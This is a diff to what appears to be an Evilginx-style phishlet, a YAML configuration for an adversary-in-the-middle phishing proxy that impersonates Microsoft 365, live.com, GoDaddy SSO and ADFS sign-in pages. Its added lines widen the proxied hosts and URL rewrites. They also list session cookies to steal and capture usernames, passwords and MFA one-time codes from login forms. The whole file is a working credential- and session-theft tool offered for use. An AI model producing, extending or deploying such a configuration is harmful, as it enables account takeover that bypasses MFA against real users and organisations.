@@ -1,20 +1,44 @@
 min_ver: '3.0.0'
 author: '0fukuAkz'
 proxy_hosts:
+  # Microsoft primary auth
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'loginw', orig_sub: 'login', domain: 'windows.net', session: true, is_landing: false, auto_filter: true}
+
+  # Office apps
   - {phish_sub: 'outlook365', orig_sub: 'outlook', domain: 'office365.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'products', orig_sub: 'products', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'res', orig_sub: 'res', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+
+  # Consumer (MSA) / live.com
   - {phish_sub: 'loginlive', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'outlooklive', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+
+  # Microsoft CDNs
   - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdnalt', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'aadcdnimg', orig_sub: 'aadcdn', domain: 'msauthimages.net', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'lgincdn', orig_sub: 'logincdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
 
+  # GoDaddy SSO (for federated M365 tenants)
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ssoss', orig_sub: 'sso', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'emailss', orig_sub: 'email', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mya', orig_sub: 'mya', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'accountgd', orig_sub: 'account', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'wwwgd', orig_sub: 'www', domain: 'godaddy.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'img1', orig_sub: 'img1', domain: 'wsimg.com', session: false, is_landing: false, auto_filter: true}
+
+  # ADFS / generic federation (wildcard)
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: '*', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'fs', orig_sub: 'fs', domain: '*', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sts', orig_sub: 'sts', domain: '*', session: true, is_landing: false, auto_filter: true}
+
 sub_filters:
+  # From login.microsoftonline.com — rewrite every known proxied origin
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'windows.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'outlook', domain: 'office365.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
@@ -22,12 +46,50 @@ sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msauthimages.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  # Federation redirect URLs (inside GetCredentialType JSON and other responses)
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'secureserver.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+
+  # From aadcdn.msftauth.net — CDN scripts may reference login
   - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'login', domain: 'windows.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
 
+  # From www.office.com — Office Home redirects through login/live
+  - {triggers_on: 'www.office.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'outlook', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+
+  # From outlook.office.com — OWA references
+  - {triggers_on: 'outlook.office.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.office.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+
+  # From login.live.com — consumer flow self + back-links
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+
+  # From GoDaddy — rewrite cross-refs back to Microsoft and within GoDaddy
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'secureserver.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'mya', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'account', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'img1', domain: 'wsimg.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+
+  # ADFS / fs / sts federation passthroughs
+  - {triggers_on: 'adfs.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'fs.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'sts.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
 auth_tokens:
+  # Microsoft primary auth cookies
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT,opt', 'SignInStateCookie,opt', 'buid,opt', 'esctx,opt', 'fpc,opt', 'stsservicecookie,opt', 'x-ms-gateway-slice,opt', 'ch,opt']
     type: 'cookie'
@@ -40,9 +102,57 @@ auth_tokens:
     keys: ['buid,opt', 'esctx,opt', 'SignInStateCookie,opt', 'AADSSO,opt', 'SSOCOOKIEPULLED,opt', 'CCState,opt']
     type: 'cookie'
 
+  # Office 365 session cookies
+  - domain: '.office365.com'
+    keys: ['OIDC,opt', 'RPSAuth,opt', 'RPSSecAuth,opt', 'UserIndex,opt', 'MUID,opt']
+    type: 'cookie'
+
+  - domain: '.office.com'
+    keys: ['OIDC,opt', 'RPSAuth,opt', 'RPSSecAuth,opt', 'MUID,opt', 'MC1,opt', 'MSCC,opt', 'OH.SID,opt', 'OH.FLID,opt']
+    type: 'cookie'
+
+  - domain: '.outlook.office365.com'
+    keys: ['OutlookSession,opt', 'UC,opt', 'X-OWA-CANARY,opt', 'ClientId,opt', 'RPSAuth,opt', 'RPSSecAuth,opt']
+    type: 'cookie'
+
+  # Live.com consumer auth
+  - domain: '.login.live.com'
+    keys: ['MSPAUTH,opt', 'MSPAuth,opt', 'MSPProf,opt', 'MSPRequ,opt', 'MSPCID,opt', 'RPSSecAuth,opt', 'MSPBack,opt', 'MSPPre,opt', 'WLSSC,opt', 'SDIDC,opt', 'RpsContextCookie,opt']
+    type: 'cookie'
+
+  - domain: '.live.com'
+    keys: ['PPLState,opt', 'NAP,opt', 'ANON,opt', 'OParams,opt']
+    type: 'cookie'
+
+  # GoDaddy SSO cookies (federated tenants)
+  - domain: 'sso.godaddy.com'
+    keys: ['auth_idp,opt', 'auth_idp_ref,opt', 'info_idp,opt', 'market,opt', 'currency,opt', 'akaas_godaddy,opt', 'visitor,opt']
+    type: 'cookie'
+
+  - domain: '.godaddy.com'
+    keys: ['cid,opt', 'gdps,opt', 'traffic_phkey,opt', 'logged_in,opt']
+    type: 'cookie'
+
+  - domain: 'sso.secureserver.net'
+    keys: ['secureserver_auth,opt', 'ss_refresh,opt', 'ss_session,opt']
+    type: 'cookie'
+
+  # ADFS (federated tenants using native ADFS)
+  - domain: 'adfs.*'
+    keys: ['MSISAuth,opt', 'MSISAuthenticated,opt', 'MSISSignOut,opt', 'MSISLoopDetectionCookie,opt', 'MSISAuth1,opt', 'MSISAuth2,opt']
+    type: 'cookie'
+
+  - domain: 'fs.*'
+    keys: ['MSISAuth,opt', 'MSISAuthenticated,opt', 'MSISSignOut,opt', 'MSISLoopDetectionCookie,opt']
+    type: 'cookie'
+
+  - domain: 'sts.*'
+    keys: ['MSISAuth,opt', 'MSISAuthenticated,opt', 'MSISSignOut,opt', 'MSISLoopDetectionCookie,opt']
+    type: 'cookie'
+
 credentials:
   username:
-    key: 'login'
+    key: 'loginfmt'
     search: '(.*)'
     type: 'post'
 
@@ -52,16 +162,48 @@ credentials:
     type: 'post'
 
   custom:
-    - key: 'loginfmt'
-      search: '(.*)'
-      type: 'post'
+    # Alternative Microsoft field
+    - {key: 'login', search: '(.*)', type: 'post'}
+    # Consumer / MSA
+    - {key: 'username', search: '(.*)', type: 'post'}
+    - {key: 'password', search: '(.*)', type: 'post'}
+    # GoDaddy SSO
+    - {key: 'loginName', search: '(.*)', type: 'post'}
+    # ADFS
+    - {key: 'UserName', search: '(.*)', type: 'post'}
+    - {key: 'Password', search: '(.*)', type: 'post'}
+    # MFA / OTP codes
+    - {key: 'otc', search: '(.*)', type: 'post'}
+    - {key: 'code', search: '(.*)', type: 'post'}
+    - {key: 'otp', search: '(.*)', type: 'post'}
+    - {key: 'pin', search: '(.*)', type: 'post'}
 
 auth_urls:
+  # Microsoft completion endpoints
   - '/kmsi'
   - '/common/login'
   - '/common/SAS/ProcessAuth'
   - '/common/reprocess'
   - '/ppsecure/post.srf'
+  - '/login.srf'
+  - '/GetSessionState'
+  # OAuth / OIDC token endpoints
+  - '/oauth2/v2.0/token'
+  - '/common/oauth2/v2.0/token'
+  - '/(common|organizations|consumers|[0-9a-f-]+)/oauth2/v2\.0/token'
+  # SAML / WS-Fed federation acceptance
+  - '/(common|organizations|consumers|[0-9a-f-]+)/saml2'
+  - '/(common|organizations|consumers|[0-9a-f-]+)/wsfederation'
+  - '/(common|organizations|consumers|[0-9a-f-]+)/federation/oauth2'
+  - '/winauth/trust/'
+  # ADFS
+  - '/adfs/ls/'
+  # GoDaddy SSO completion
+  - '/oidc/token'
+  - '/login/idp'
+  - '/v1/auth/token'
+  - '/v1/api/idp/login'
+  - '/v1/api/token'
 
 login:
   domain: 'login.microsoftonline.com'
